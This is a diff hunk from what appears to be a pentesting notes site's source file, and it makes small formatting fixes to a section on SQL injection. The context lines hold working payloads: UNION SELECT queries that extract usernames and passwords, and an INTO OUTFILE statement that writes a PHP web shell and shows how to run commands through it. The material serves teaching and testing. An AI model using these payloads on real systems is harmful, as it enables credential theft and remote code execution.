@@ -701,7 +701,7 @@ The **COLUMNS** table in the **INFORMATION_SCHEMA** Database contains informatio
 
 • First, find out no. columns and the datatype of it.  
 • Then find out the name of the table and columns.  
-**If 4 columns **are present and **you can **retrieve data **from 2 **columns, **then put null for the other columns**  
+**If 4 columns** are present and **you can ** retrieve data **from 2** columns, **then put null for the other columns**  
 Eg: <span class="cmd">' UNION SELECT NULL, username, password, NULL FROM users--</span>
 
 ## Retrieving multiple values in single column
@@ -709,7 +709,7 @@ Eg: <span class="cmd">' UNION SELECT NULL, username, password, NULL FROM users--
 Conatenation: Refer cheatsheet for syntax  
 If only 1 column accepts strings, concatenate both fields with a delimiter  
 For eg:   
-	<span class="cmd">' UNION SELECT null, username || '~' || password FROM users--</span>  
+	<span class="cmd">' UNION SELECT null, username || '\\~' || password FROM users--</span>  
 Use delimiter like '~' or '@' in the middle to make out the different fields
 
 # Reading Files
@@ -778,7 +778,7 @@ Write through SQLi:
 <span class="cmd">select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'</span>  
 To execute commands: <span class="cmd">/filename.php?0=[command]</span>
 
-NOTE: all the placeholders/columns must be satisfied. for columns use open,close quotes ""`,
+NOTE: all the placeholders/columns must be satisfied. for columns use open, close quotes ""`,
                 children: [
                   {
                     slug: "sqlmap",
